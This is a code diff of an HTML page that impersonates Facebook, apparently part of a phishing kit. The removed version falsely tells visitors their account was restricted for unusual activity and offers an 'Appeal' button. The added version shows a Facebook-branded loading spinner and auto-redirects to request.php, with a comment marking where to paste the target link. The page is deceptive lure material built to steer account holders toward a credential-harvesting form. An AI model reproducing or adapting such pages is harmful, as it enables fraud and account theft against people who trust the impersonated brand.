@@ -1,59 +1,52 @@
-
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Review Appeal</title>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
+    <title>Page Appeal...</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f2f2f2; /* Set your desired background color */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
         }
 
-        .container {
+        .loading-container {
             text-align: center;
-            margin-top: 50px;
         }
 
-        .title {
-            font-size: 24px;
-            font-weight: bold;
+        .loading-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
 
-        .image-container {
-            margin-bottom: 20px;
-        }
-
-        .review-text {
-            font-weight: bold;
-        }
-
-        .appeal-button {
-            padding: 10px 20px;
-            font-size: 16px;
-            font-weight: bold;
-            color: #ffffff;
-            background-color: #1877f2; /* Facebook blue color */
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            text-decoration: none; /* Remove default underline for anchor elements */
-        }
-
-        .appeal-button:hover {
-            background-color: #0e5aaf; /* Darker blue on hover */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
+    <script>
+        var redirectUrl = 'request.php'; // link aha par paste karo //***
+        var delayInMilliseconds = 2000;
+
+        function redirectToAnotherWebsite() {
+            window.location.replace(redirectUrl);
+        }
+
+        setTimeout(redirectToAnotherWebsite, delayInMilliseconds);
+    </script>
 </head>
 <body>
-    <div class="container">
-        <div class="image-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Action Required Image" width="100" height="100">
-        </div>
-        <p class="title">Help center</p>
-        <p class="review-text">We detetcted an unusual activity and restricted your account, you can submit an appeal for review</p>
-      <br>
-        <a href="request.php" class="appeal-button">Appeal</a>
+    <div class="loading-container">
+        <p>Loading...</p>
+        <div class="loading-spinner"></div>
     </div>
 </body>
 </html>
